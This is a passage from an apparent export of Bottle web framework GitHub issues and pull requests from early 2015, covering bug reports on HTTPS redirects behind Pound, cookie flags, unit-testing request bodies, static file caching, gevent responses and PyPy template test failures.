    $ curl --insecure -vvv  -L https://192.168.0.250:18443/testredirect
    * Hostname was NOT found in DNS cache
    *   Trying 192.168.0.250...
    * Connected to 192.168.0.250 (192.168.0.250) port 18443 (#0)
    * successfully set certificate verify locations:
    *   CAfile: /opt/local/share/curl/curl-ca-bundle.crt
    CApath: none
    * SSLv3, TLS handshake, Client hello (1):
    * SSLv3, TLS handshake, Server hello (2):
    * SSLv3, TLS handshake, CERT (11):
    * SSLv3, TLS handshake, Server key exchange (12):
    * SSLv3, TLS handshake, Server finished (14):
    * SSLv3, TLS handshake, Client key exchange (16):
    * SSLv3, TLS change cipher, Client hello (1):
    * SSLv3, TLS handshake, Finished (20):
    * SSLv3, TLS change cipher, Client hello (1):
    * SSLv3, TLS handshake, Finished (20):
    * SSL connection using TLSv1.0 / DHE-RSA-AES256-SHA
    * CERT info removed for security purposes 
    > GET /testredirect HTTP/1.1
    > User-Agent: curl/7.37.0
    > Host: 192.168.0.250:18443
    > Accept: */*
    > 
    * HTTP 1.0, assume close after body
    < HTTP/1.0 303 See Other
    < Date: Thu, 19 Mar 2015 13:51:46 GMT
    < Server: WSGIServer/0.1 Python/2.6.1
    < Location: http://192.168.0.250:18443/test
    < Content-Type: text/html; charset=UTF-8
    < Content-Length: 0
    * Closing connection 0
    * SSLv3, TLS alert, Client hello (1):
    * Issue another request to this URL: 'http://192.168.0.250:18443/test'
    * Hostname was found in DNS cache
    *   Trying 192.168.0.250...
    * Connected to 192.168.0.250 (192.168.0.250) port 18443 (#1)
    > GET /test HTTP/1.0
    > User-Agent: curl/7.37.0
    > Host: 192.168.0.250:18443
    > Accept: */*
    > 
    * Empty reply from server    
    * Connection #1 to host 192.168.0.250 left intact


```

Pound config file for reference:

```
LogFacility -
LogLevel    4

ListenHTTPS
            Address 0.0.0.0
            Port    18443
            Cert    ""/etc/server.pem""
            Service
                BackEnd
                    Address 127.0.0.1
                    Port    18080
                End
            End
        End
```

Testing after changing service port to 443:

```
$ curl --insecure -vvv  -L https://192.168.0.250:443/testredirect
* Hostname was NOT found in DNS cache
*   Trying 192.168.0.250...
* Connected to 192.168.0.250 (192.168.0.250) port 443 (#0)
* successfully set certificate verify locations:
*   CAfile: /opt/local/share/curl/curl-ca-bundle.crt
  CApath: none
* SSLv3, TLS handshake, Client hello (1):
* SSLv3, TLS handshake, Server hello (2):
* SSLv3, TLS handshake, CERT (11):
* SSLv3, TLS handshake, Server key exchange (12):
* SSLv3, TLS handshake, Server finished (14):
* SSLv3, TLS handshake, Client key exchange (16):
* SSLv3, TLS change cipher, Client hello (1):
* SSLv3, TLS handshake, Finished (20):
* SSLv3, TLS change cipher, Client hello (1):
* SSLv3, TLS handshake, Finished (20):
*    SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /testredirect HTTP/1.1
> User-Agent: curl/7.37.0
> Host: 192.168.0.250
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 303 See Other
< Date: Thu, 19 Mar 2015 14:26:50 GMT
< Server: WSGIServer/0.1 Python/2.6.1
< Location: https://192.168.0.250/test
< Content-Type: text/html; charset=UTF-8
< Content-Length: 0
< 
* Closing connection 0
* SSLv3, TLS alert, Client hello (1):
* Issue another request to this URL: 'https://192.168.0.250/test'
* Hostname was found in DNS cache
*   Trying 192.168.0.250...
* Connected to 192.168.0.250 (192.168.0.250) port 443 (#1)
* successfully set certificate verify locations:
*   CAfile: /opt/local/share/curl/curl-ca-bundle.crt
  CApath: none
* SSL re-using session ID
* SSLv3, TLS handshake, Client hello (1):
* SSLv3, TLS handshake, Server hello (2):
* SSLv3, TLS change cipher, Client hello (1):
* SSLv3, TLS handshake, Finished (20):
* SSLv3, TLS change cipher, Client hello (1):
* SSLv3, TLS handshake, Finished (20):
* SSL connection using TLSv1.0 / DHE-RSA-AES256-SHA
* Server certificate:
*    SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /test HTTP/1.0
> User-Agent: curl/7.37.0
> Host: 192.168.0.250
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Date: Thu, 19 Mar 2015 14:26:50 GMT
< Server: WSGIServer/0.1 Python/2.6.1
< Content-Length: 11
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection 1
* SSLv3, TLS alert, Client hello (1):
```
"
737,Lazy routes,2015-03-19T12:22:07Z,,,,,"Hello,

Recently I started a personal project, where I use bottle.

But, thinking about the routes, I was searching for a way to do ""lazy routes"" where the methods that register a path to the route, dont need to be ""called"".

I implemented some classes, with methods that register routes, and I dont want to call them all, in the WSGI file.

Are there a way to do that?

Ps.: Sorry for my english
"
736,only import subprocess if it's needed,2015-03-17T18:26:11Z,2015-03-24T12:51:32Z,,,,"Currently, Bottle imports the subprocess module always, even though it's only used with the auto-reloader behavior. This change only imports the module when it will be used.

I'm using Bottle via an embedded Python interpreter in a not-entirely-Python application. Importing the subprocess module causes the embedded Python to try to handle signals. I want all signal handling done in the embedding application, and auto-reload doesn't work for embedding anyway, so I don't want to load subprocess.
"
735,A False `secure` option on `set_cookie` marks cookie as secure in response headers,2015-03-15T06:18:46Z,2015-06-14T17:32:26Z,,,,"if i execute 

```
response.set_cookie('s', signed_session,
                            path='/', secure=False)
```

it will require HTTPS on the cookie. It should only do this when `secure=True`. If I remove the `secure` keyword, it does not mark it as secure (as it should).
Does anyone else have this problem? I am running this on python 3.4 on archlinux. 
"
734,Updated link to Google App Engine in Readme.rst,2015-03-13T03:56:52Z,2015-03-13T17:19:30Z,,,,"The link to the Google App Engine at code.google.com no longer functions, so it has been updated to point to the current Google App Engine PaaS site.
"
733,Is there any way to make reloader run when files other than modules change?,2015-03-10T23:50:56Z,,,,,"For instance, I have a less plugin that compiles into css when the server starts. However, to recompile .less file after a small change, I need to restart web server.

So, is there a way to add folders that reloader watches other than module files?
"
732,Resolve Issue 727: fix KeyError during 'wsgi.input' lookup in environ when unit testing,2015-03-09T20:08:18Z,2015-03-24T13:48:03Z,,(Note,(Note: I recreated this pull request from a new feature branch as my previous was from master; as-per the recommended workflow in your developer documentation),"Regarding issue #727 . I've fixed the runtime error by first creating a failing test which also demonstrates (for users of bottle.py) how to unit test a route function that uses a body. I couldn't personally see this anywhere on the web or in bottle.py's documentation.

Hopefully this is useful and to conventions/tastes of the project.

(Note: I recreated this pull request from a new feature branch as my previous was from master; as-per the recommended workflow in your developer documentation)
"
731,Fix wsgi.input lookup and demonstrate unit tests that need a request body,2015-03-09T19:14:55Z,2015-03-09T20:08:44Z,,,,"Regarding issue #727 . I've fixed the runtime error by first creating a failing test which also demonstrates (for users of bottle.py) how to unit test a route function that uses a body. I couldn't personally see this anywhere on the web or in bottle.py's documentation.

Hopefully this is useful and to conventions/tastes of the project. I will happily provide a short documentation paragraph for the docs on bottlepy.org but have yet to work out how to do so.
"
730,"What's next for novelty (future project, evolution is necessary)?",2015-03-09T13:17:38Z,,,,,"Hey guys and @defnull!

How to open source project we need to think what's next big again in the future from the Bottle, I know it is a very complicated, but we have a roadmap. This will help new employees get close to the Bottle and active users collaborate even more.

A few points I think it's important to improve, in the process of cooperation/comunity:
- Have a code review faster in the PR generated by the community, always giving feedback to users who open the PR;
- Bottle has generation of new full release slowly, so we need to think of a release for 1 year (or longer), but we need to leave this open for every developer;
- With the item so we need to create a roadmap before starting the development of a release, so more employees could help;

What do you think? I'm opening this issue thinking about improving our process of evolution.
These Python Conference not found many speak about Bottle, it would be extremely important to have more people talking about Bottle.
So let's bring in new developers to help our community.
"
729,Fix tutorial app routes syntax to bottle 0.10+,2015-03-09T05:03:42Z,2015-03-24T13:05:35Z,,,,
728,Updated four to five,2015-03-09T02:38:52Z,2015-03-13T17:37:49Z,,,,
727,Unit testing when using request.body fails with KeyError: 'wsgi.input',2015-03-04T15:58:56Z,2015-03-24T13:47:09Z,,KeyError,KeyError: 'wsgi.input',"When unit testing a bottle py route function:

```
from bottle import request, run, post
@post(""/blah/<boo>"")
def blah(boo):
    body = request.body.readline()
    return ""body is %s"" % body
blah(""booooo!"")
```

The following exception is raised:

```
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""<stdin>"", line 3, in blah
  File ""bottle.py"", line 1197, in body
    self._body.seek(0)
  File ""bottle.py"", line 166, in __get__
    if key not in storage: storage[key] = self.getter(obj)
  File ""bottle.py"", line 1164, in _body
    read_func = self.environ['wsgi.input'].read
KeyError: 'wsgi.input'
```

The code will work if running as a server via bottle's run function, it's purely when I call it as a normal Python function e.g. in a unit test that the exception is raised.

Being able to unit test the individual route functions is very useful, but I'm a bit stumped on this one.
"
726,Router unable to match wildcard filter in the middle of a URL,2015-03-04T03:25:58Z,,,,,"I'm trying to use the **:path** wildcard filter (as described [here](http://bottlepy.org/docs/dev/routing.html#wildcard-filters)) to match part of my URL, which includes a forward slash character. For example, if I have the URL:

```
/resources/adfs89s7/container/asdf%2Fasdf/items
```

(where %2F is the forward slash), I want to match it to the route:

```
/resources/<resource_id>/container/<container_name:path>/items
```

However, this is currently returning a Not Found error. I have similar URLs where the wildcard filter is at the end of the URL, e.g.

```
/resources/<resource_id>/container/<container_name:path>
```

and that seems to work fine.
"
725,"GeventServer ignores ""log"" keyword arg",2015-03-01T15:47:43Z,,,,,"The current code in GeventServer effectively ignores a keyword arg of ""log"", overwriting it either with ""default"" or None depending on the state of ""self.quiet"".

The expected behavior is that if self.quiet is not true, a log argument can be passed down to the WSGIServer. WSGIServer already has `log=""default""` in its keyword args so the adapter doesn't need to, and should not, supply this explicitly itself.

Current code:

```
self.options['log'] = None if self.quiet else 'default'
```

Suggested new code:

```
if self.quiet: self.options['log'] = None
```

Edit: I should note, this applies to bottle 0.12 (and the latest code in master), and gevent 1.0.1. Earlier gevent (I checked 5c11789cabcc0cf737313cb0fdcb727a8dc38629 from 2011) would output to stderr if ""log=None"" so the current code in bottle would be broken for that version anyway (i.e. quiet=True would not actually silence the log output).
"
724,GET http://.../somefile net::ERR_INCOMPLETE_CHUNKED_ENCODING,2015-02-27T02:17:33Z,,,,,"Hi.
I am running Bottle 0.12.8 app behind nginx 1.6.2.
My problem is with static files served using:

```
@route('/vendor/<filename:path>')
def static_vendor(filename):
    return static_file(filename, root=currentpath+'/vendor')
```

visiting my website in Chrome 40.0.2214.115 keeps return me this error:

```
GET http://.../vendor/somefile.css net::ERR_INCOMPLETE_CHUNKED_ENCODING
```

I am running my `run_server.py` file using `supervisord` and the parameters I send to the bottle run function are:

```
run(host='0.0.0.0', port=7463, debug=True, reloader=True, server='gunicorn')
```

I've looked everywhere in the web, added several options to nginx like `proxy_buffering off;` but nothing works.

My nginx .conf file is:

```
server {
    listen 80;
    server_name ...;

    location / {
        proxy_pass http://127.0.0.1:7463/;
        proxy_connect_timeout 10s;   # instead of 60s default
        proxy_read_timeout 10s;      # instead of 60s default

        # set client headers for proxy
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Scheme $scheme;

        # I've tried those with different values but without help
        #proxy_buffering off;
        #proxy_buffers 8 8k;
        #proxy_busy_buffers_size 16k;
        #proxy_buffer_size 8k;

        # return proxy headers to client
        proxy_pass_header Server;     # pass original server header
    }
}
```
- I have gzip enabled at my nginx, if this have any meaning.
- Note that from the same nginx proxy server I serve static files redirecting Apache, IIS, Golang, Flask and some others. I have this error only in this website using bottle.

Maybe you can help and knows what the problem is.
Thank you in advance, and thank you for a great framework!!
"
723,"bottle modifies http.client.responses upon import, likely unintentially",2015-02-25T18:38:10Z,2015-06-14T17:40:02Z,,,,"I noticed this today while looking at the source for bottle.py (version 0.12.8)

``` python
#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')
HTTP_CODES = httplib.responses
HTTP_CODES[418] = ""I'm a teapot"" # RFC 2324
HTTP_CODES[422] = ""Unprocessable Entity"" # RFC 4918
HTTP_CODES[428] = ""Precondition Required""
HTTP_CODES[429] = ""Too Many Requests""
HTTP_CODES[431] = ""Request Header Fields Too Large""
HTTP_CODES[511] = ""Network Authentication Required""
_HTTP_STATUS_LINES = dict((k, '%d %s'%(k,v)) for (k,v) in HTTP_CODES.items())
```

This ends up modifying the actual dictionary used by http.client.responses, which I suspect is not intended (though is probably harmless most of the time):

```
>>> import http.client
>>> http.client.responses.get(418)
>>> import bottle
>>> http.client.responses.get(418)
""I'm a teapot""
```

The trivial fix here would be to change the first line to 

``` python
HTTP_CODES = httplib.responses.copy()
```
"
722,Empty request body under load,2015-02-22T09:48:55Z,,,,,"I am using uwsgi 2.0.8 and bottle 0.12.7 with gevent.

This is my uwsgi configuration:

http-socket: :8888
processes: 4
master: 1
daemonize: /tmp/mylog.log
listen: 128
module: server
gevent: 2
stats: :9191

It is running on an AWS ec2 vm with 1 core and 2 gigs of ram, ubuntu 14.04.1 LTS

I'm posting base64 encodings in the body of http requests to uwsgi under load of about 5-6 requests per second.  The majority of requests are processed just fine and return with a 200 response, though there are occasionally a few rare requests whose responses are a 500 status.  After doing a little debugging, I noticed that the request body will be empty when the response comes back with a 500, and I'm trying to determine what could be the cause of this empty request body which is supposed to contain the base64 payload.  The 500 is happening because I haven't properly handled the case of an empty request body, though the underlying issue is still unknown (ie. the empty request body).  I know it is not an issue with the client and that the client is sending the request properly with the base64 encoding in the request body so I can only conclude it's something server-side, either uwsgi or bottle.  The base64 payload is only about 3k in size.  What would be causing this request body payload to disappear intermittently?  I'm using request.body.read() in order to retrieve it.  
"
721,Added another recipe for removing trailing slashes,2015-02-18T23:21:49Z,2015-03-13T17:39:50Z,,,,"This one is using a `before_request` hook to strip the trailing slash from `request.environ['PATH_INFO']`. I prefer it to the WSGI middleware method because it leaves the API of the app intact. For example, in the `StripPathMiddleware` snippet, you can't later add a route to `myapp` because you'll get the following error: `AttributeError: 'StripPathMiddleware' object has no attribute 'route'`.
"
720,Accept unicode keys in ConfigDict.load_dict,2015-02-18T21:04:33Z,2015-07-25T11:38:46Z,,,,"I was recently trying to follow the JSON file example in the [loading configuration from a nested `dict`](http://bottlepy.org/docs/dev/configuration.html#loading-configuration-from-a-nested-dict) documentation, but I ran into a `TypeError`.

It turns out that JSON files loaded with `json` from the standard library have `unicode` keys (whereas using the `simplejson` module will result in `str` keys). Trying to load a dictionary with `unicode` keys into the configuration with `load_dict` will raise a `TypeError`.

I was able to fix this locally by making sure `load_dict` would accept either `str` or `unicode` as keys and making sure `__setitem__` would convert Unicode keys to bytes (so there wouldn't be a mix of `str` and `unicode` keys in the configuration).
"
719,exception not handled,2015-02-18T13:41:11Z,,,,,"Note: This is a copy of [a Stack Overflow question](http://stackoverflow.com/questions/28316455/where-and-by-whom-should-this-exception-be-caught) I asked some time ago. I feel that the exception should be handled by bottle, feel free to cloe the issue if you thing otherwise.

---

I have a very simple API server built on top of `bottle`. What is does is to just return a JSON upon being called, the content of the JSON being a random string. It works great.

This server was scanned yesterday by a vulnerability scanner (`nessus`) and crashed because of a misbehavior of the scanner. I include the Traceback information below which shows a `error: [Errno 10054] An existing connection was forcibly closed by the remote host` exception.

My question is the following: who is the one who should handle this problem?
- Is this `nessus`, which does unholy things? On the one hand yes, it should behave in a standard way (this is a scanner which, among others, is used for industrial scans where it meets all sorts of devices and should attempt to mitigate the risk of crashes). On the other hand life is brutal and the receiving end (what is scanned) should be able to cope.
- Is this `bottle` ? It is a framework which should handle typical and not so typical web traffic and leave to the programmer the task of handling the business logic and not the internals
- Is this me? handling all the possible exceptions

I am asking as I would like to help improve either `nessus` or `bottle` (or myself) - this is not strictly a programming problem (""how to catch the exception"") so if you really feel so, vote to close as opinion-based, though I ask anyway as I see it as a ""programmers methodology"" question.

The error stack:

```
C:\Python27\python.exe C:/Users/yop/Documents/dev/infoscreen/webserver.py
10.81.163.129 - - [03/Feb/2015 18:21:00] code 400, message Bad request syntax ('\x16\x03\x01\x00\xea\x01\x00\x00\xe6\x03\x01T\xd1\x03|\xb3\x02lm\xf0\xb92\x9a\xd7\xa7\xec\xbca\xdaR9\xfc\xe3]);`\xfbI\x98\x17\x94\xe3\x00\x00x\xc0\x14\xc0')
10.81.163.129 - - [03/Feb/2015 18:21:05] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\xea\x01\x00\x00\xe6\x03\x01T\xd1\x03\x81\xfcxI\x0e\xd5\xc4\xba\x17\xd9\x92\x9f+\x83BR\x10\x94N\xa5\x12\xc0')
10.81.163.129 - - [03/Feb/2015 18:21:24] code 400, message Bad request version ('Secure-HTTP/1.4')
10.81.163.129 - - [03/Feb/2015 18:21:24] code 400, message Bad request syntax (""\x16\x03\x01\x00\xea\x01\x00\x00\xe6\x03\x01T\xd1\x03\x95\x95\x154\x94h/5\x8dL\xa6\x148\x04#s\x13\x9f'\xec\x1az\xbc\x87/L\x0e\xc7\x02\x00\x00x\xc0\x14\xc0"")
Traceback (most recent call last):
----------------------------------------
  File ""C:\Python27\lib\SocketServer.py"", line 295, in _handle_request_noblock
Exception happened during processing of request from ('10.81.163.129', 57035)
    self.process_request(request, client_address)
  File ""C:\Python27\lib\SocketServer.py"", line 321, in process_request
    self.finish_request(request, client_address)
  File ""C:\Python27\lib\SocketServer.py"", line 334, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""C:\Python27\lib\SocketServer.py"", line 651, in __init__
    self.handle()
  File ""C:\Python27\lib\wsgiref\simple_server.py"", line 117, in handle
    if not self.parse_request(): # An error code has been sent, just exit
  File ""C:\Python27\lib\BaseHTTPServer.py"", line 291, in parse_request
    self.headers = self.MessageClass(self.rfile, 0)
  File ""C:\Python27\lib\mimetools.py"", line 25, in __init__
----------------------------------------
    rfc822.Message.__init__(self, fp, seekable)
  File ""C:\Python27\lib\rfc822.py"", line 108, in __init__
    self.readheaders()
  File ""C:\Python27\lib\rfc822.py"", line 155, in readheaders
    line = self.fp.readline()
  File ""C:\Python27\lib\socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
error: [Errno 10054] An existing connection was forcibly closed by the remote host
Traceback (most recent call last):
----------------------------------------
  File ""C:\Python27\lib\SocketServer.py"", line 295, in _handle_request_noblock
    self.process_request(request, client_address)
Exception happened during processing of request from ('10.81.163.129', 37539)
  File ""C:\Python27\lib\SocketServer.py"", line 321, in process_request
----------------------------------------
    self.finish_request(request, client_address)
  File ""C:\Python27\lib\SocketServer.py"", line 334, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""C:\Python27\lib\SocketServer.py"", line 651, in __init__
    self.handle()
  File ""C:\Python27\lib\wsgiref\simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""C:\Python27\lib\socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
error: [Errno 10054] An existing connection was forcibly closed by the remote host
----------------------------------------
Traceback (most recent call last):
Exception happened during processing of request from ('10.81.163.129', 38322)
  File ""C:\Python27\lib\SocketServer.py"", line 295, in _handle_request_noblock
----------------------------------------
    self.process_request(request, client_address)
  File ""C:\Python27\lib\SocketServer.py"", line 321, in process_request
    self.finish_request(request, client_address)
  File ""C:\Python27\lib\SocketServer.py"", line 334, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""C:\Python27\lib\SocketServer.py"", line 651, in __init__
    self.handle()
  File ""C:\Python27\lib\wsgiref\simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""C:\Python27\lib\socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
error: [Errno 10054] An existing connection was forcibly closed by the remote host

Process finished with exit code -1
```
"
718,"static_file behaves incorrectly when serving different files from the same URL, due to incorrect caching",2015-02-16T16:26:34Z,,,,,"I recently encountered a strange issue where my browser was returned a `304 Not Modified` response by my Bottle app, even though the content it was fetching most defininately was modified. It turns out this was caused by a problem in `static_file`:
### The problem

Given a router that looks like this:

```
@get('/some-url')
def someFile():
    if some_dynamic_property:
        return static_file('some-file-A')
    else:
        return static_file('some-file-B')
```

Given that:
- The modification time of `some-file-A` (as provided by the filesystem) is greater than that of `some-file-B`.
- `some_dynamic_property` is `True`.

Then, the following situation can occur:
- A client fetches `/some-url`.
- A 200 response arrives with the contents of `some-file-A` and its `Last-Modified` header set to that file's modification date.
- `some_dynamic_property` is changed to `False` (meaning future requests should yield `some-file-B`).
- The same client requests `/some-url` again, with the `If-Modified-Since` header set to the previously received
  `Last-Modified` value.
- **A 304 Not Modified response is returned**, leading the client to continue using `some-file-A`.
### Expected behavior

Instead of a 304 response, a 200 response with the contents of `some-file-B` should have been returned.
### Cause

In order to determine whether to return a `304 Not Modified` response, `static_file` compares the `If-Modified-Since` header of the request to the modification date of the file to serve. However, it incorrectly assumes this modification date actually corresponds to the same file; when this is not the case (i.e. whenever one route may serve more than a single different file), it incorrectly tells the client it can reuse the previous result.
### Quick workaround

Unset the `Last-Modified` header:

```
@get('/some-url')
def someFile():
    if some_dynamic_property:
        resp = static_file('some-file-A')
    else:
        resp = static_file('some-file-B')

    resp.set_header('Last-Modified', '')
    return resp
```

Note that **this disables client-side caching for this URL**, which is often undesirable. Otherwise, one has to manually implement one of the solutions listed below.
### Potential solutions
- Stop using the `Last-Modified` header for caching but instead provide an `ETag`, derived from a checksum/hash of the file contents.
- A disadvantage of the previous approach is that the file always has to be read in its entirety before a hash can be calculated. This can be prevented by caching hashes until the corresponding files change, or by obtaining the tag by hashing a file's path along with its modification date.
- Add an argument to `static_file` that allows a caching method to be selected. The options could be `'none'`,
  `'etag'`, `'last-modified'` and `'etag+last-modified'`. Preferably `'last-modified'` should not be the default.
- Declare this to be intended behavior, but explicitly mention this issue in the documentation of `static_file`.

I hope that this problem can be resolved. If desired, I could provide a patch implementing one of these solutions myself.
"
717,fixes #671 and add pass exception to `after_request` hook callback when it it occured.,2015-02-15T17:12:36Z,2016-02-12T10:37:25Z,,,,"First, `before_request` and `after_request` is very useful hooks for resource management, but `after_request` must know has any exception is raised while request be processing, for decide how to release resource, commit or rollback database transaction for example.
Then, I read @vascop 's PR https://github.com/bottlepy/bottle/pull/702/files and got some inspire. But his code still have some bugs, such as when RouteReset is raise, `after_request` hook callback will be called twice.
So, I extracted some code from _handle() to _inner_handle(). Collected exception and pass it to `after_request` hook callback, if not error, the argument `exc` will be None.
"
716,Add aiohttp ,2015-02-10T06:58:16Z,2015-03-24T13:07:12Z,,,,"Change branch and reopen #672
"
715,gevent.sleep/time.sleep jumbles content-length when returning json,2015-02-06T05:50:34Z,2015-02-12T14:37:04Z,,,,"Here are some information to replicate:

Bottle==0.12.7
gevent==1.0.1

Server source-code:

``` python
import gevent
from bottle import get, run, response
from gevent import monkey
monkey.patch_all()


@get(""/<text>"")
def return_declicate(text):
    """""" return a json with a given text duplicated ten times """"""
    gevent.sleep(0)
    response.content_type = ""application/json; charset=utf-8""
    return ""{\""text\"":\""%s\""}"" % text * 3


if __name__ == ""__main__"":
    run(host=""0.0.0.0"", port=9999, server=""gevent"")
```

Client code:

``` python
import threading
import urllib2
import json

# urls to hit
urls = [
    ""http://localhost:9999/barba"",
    ""http://localhost:9999/z"",
    ""http://localhost:9999/foo""
]


def show_json(url_address):
    """""" prints the json from a given url """"""
    conn = urllib2.urlopen(url_address)
    data = conn.read()
    try:
        json_data = json.loads(data)
        print json.dumps(json_data, indent=4, separators=(',', ': ')) + ""\n""
    except:
        print ""Y U NO json.loads???? (Here's why:)""
        print data, ""(%s chars)"" % len(data)


for _ in xrange(20):
    print ""#"" * 62
    # spawn one thread for each url in urls
    for url in urls:
        thread = threading.Thread(target=show_json, args=(url,))
        thread.daemon = True
        thread.start()

    # keep the main thread from returning if there are other active threads
    while threading.active_count() > 1:
        pass

print ""DONE!""
```

To replicate, run the above code for server and client and `grep` for ""Y U NO"", and notice that the output corresponds to failures in `json.loads` because the response json is malformed. This is caused by HTTP headers returned from server bearing incorrect `Content-Length`.
"
714,"test failures under pypy in release (latest) -0.12.8; FAILED (failures=3, errors=1)",2015-02-03T02:04:26Z,,,"SyntaxError, AssertionError","SyntaxError: invalid syntax, AssertionError: Syntax error in template:","under all other pythons including pypy3 all tests pass fine.

``` python
======================================================================
ERROR: test_unicode_code (test_stpl.TestSimpleTemplate)
Templates: utf8 code in file
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_stpl.py"", line 35, in test_unicode_code
    self.assertRenders(t, 'start ñç äöü end\n', var=touni('äöü'))
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_stpl.py"", line 11, in assertRenders
    self.assertEqual(touni(to), tpl.render(*args, **vars))
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 3399, in render
    self.execute(stdout, env)
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 3386, in execute
    eval(self.co, env)
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 189, in __get__
    value = obj.__dict__[self.func.__name__] = self.func(obj)
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 3344, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/views/stpl_unicode.tpl"", line 1
    _printlist((u'start ', _escape(""ñç""}} {{var), u' end\n',))
                                        ^
SyntaxError: invalid syntax

======================================================================
FAIL: test_multiline_ignore_eob_in_string (test_stpl.TestSTPLDir)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_stpl.py"", line 317, in test_multiline_ignore_eob_in_string
    self.assertRenders(source, result)
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_stpl.py"", line 280, in assertRenders
    (traceback.format_exc(), tpl.code))
AssertionError: Syntax error in template:
Traceback (most recent call last):
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_stpl.py"", line 276, in assertRenders
    tpl.co
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 189, in __get__
    value = obj.__dict__[self.func.__name__] = self.func(obj)
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py"", line 3344, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""<string>"", line 5
    _printlist((_escape(x}}{{!y), u'\n',))
                             ^
SyntaxError: Unknown character


Template code:
##########
x=5# a comment
y = '%>'# a string
# this is still code
# lets end this %>
_printlist((_escape(x}}{{!y), u'\n',))

##########

======================================================================
FAIL: test_template (test_wsgi.TestRouteDecorator)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_wsgi.py"", line 249, in test_template
    self.assertBody('test 5 6', '/test')
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/tools.py"", line 98, in assertBody
    self.assertEqual(tob(body), self.urlopen(route, **kargs)['body'])
AssertionError: 'test 5 6' != '\n    <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">\n    <html>\n        <head>\n            <title>Error: 500 Internal Server Error</title>\n            <style type=""text/css"">\n              html {background-color: #eee; font-family: sans;}\n              body {background-color: #fff; border: 1px solid #ddd;\n                    padding: 15px; margin: 15px;}\n              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}\n            </style>\n        </head>\n        <body>\n            <h1>Error: 500 Internal Server Error</h1>\n            <p>Sorry, the requested URL <tt>&#039;http://127.0.0.1/test&#039;</tt>\n               caused an error:</p>\n            <pre>Internal Server Error</pre>\n              <h2>Exception:</h2>\n              <pre>SyntaxError(&#039;invalid syntax&#039;, (&#039;&lt;string&gt;&#039;, 1, 31, &quot;_printlist((u&#039;test &#039;, _escape(a}} {{b),))\\n&quot;, 0))</pre>\n              <h2>Traceback:</h2>\n              <pre>Traceback (most recent call last):\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 862, in _handle\n    return route.call(**args)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 1732, in wrapper\n    rv = callback(*a, **ka)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3619, in wrapper\n    return template(tpl_name, **tplvars)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3595, in template\n    return TEMPLATES[tplid].render(kwargs)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3399, in render\n    self.execute(stdout, env)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3386, in execute\n    eval(self.co, env)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 189, in __get__\n    value = obj.__dict__[self.func.__name__] = self.func(obj)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3344, in co\n    return compile(self.code, self.filename or &#039;&lt;string&gt;&#039;, 